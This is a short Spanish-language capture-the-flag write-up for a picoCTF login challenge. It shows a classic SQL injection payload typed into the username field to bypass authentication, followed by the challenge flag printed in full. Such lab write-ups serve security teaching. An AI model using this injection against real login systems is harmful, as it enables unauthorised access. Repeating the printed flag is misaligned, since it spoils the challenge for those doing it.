# Descripción
Can you login to this website?Try to login [here](http://saturn.picoctf.net:58127/).
Hints:
1. `admin` is the user you want to login as.
# Solución
- Entramos a la página
- Intentamos logearnos con cualquier dato para ver como funciona
- Veremos que recibe el nombre y después la contraseña
```
SELECT * FROM users WHERE name='admin' AND password='admin'
```
- Entonces hacemos una inyección SQL en el espacio del nombre 
```
SELECT * FROM users WHERE name='1' OR '1'=='1';--' AND password='ajnas'
```
- En la página nos dirá que nos hemos logeado pero aún no podremos ver la bandera
- Entonces inspeccionamos la página y encontraremos la bandera 
```
Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}

picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}
```
# Notas adicionales
# Referencias